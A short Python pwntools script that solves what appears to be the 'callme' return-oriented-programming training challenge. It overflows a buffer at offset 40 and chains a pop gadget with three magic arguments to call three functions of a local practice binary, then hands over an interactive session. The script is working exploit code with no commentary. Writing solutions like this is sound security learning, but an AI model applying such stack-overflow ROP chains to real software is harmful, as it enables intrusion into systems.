from pwn import *

context.arch = "amd64"
elf = context.binary = ELF("./callme")

pops = p64(0x40093c)
args = p64(0xdeadbeefdeadbeef) + p64(0xcafebabecafebabe) + p64(0xd00df00dd00df00d)
callme_one = p64(elf.symbols['callme_one'])
callme_two = p64(elf.symbols['callme_two'])
callme_three = p64(elf.symbols['callme_three'])

offset = 40
payload = flat({
    offset: [
        pops,
        args,
        callme_one,

        pops,
        args,
        callme_two,

        pops,
        args,
        callme_three,
    ]
})

p = process(elf.path)
p.sendlineafter(b"> ", payload)
p.interactive()
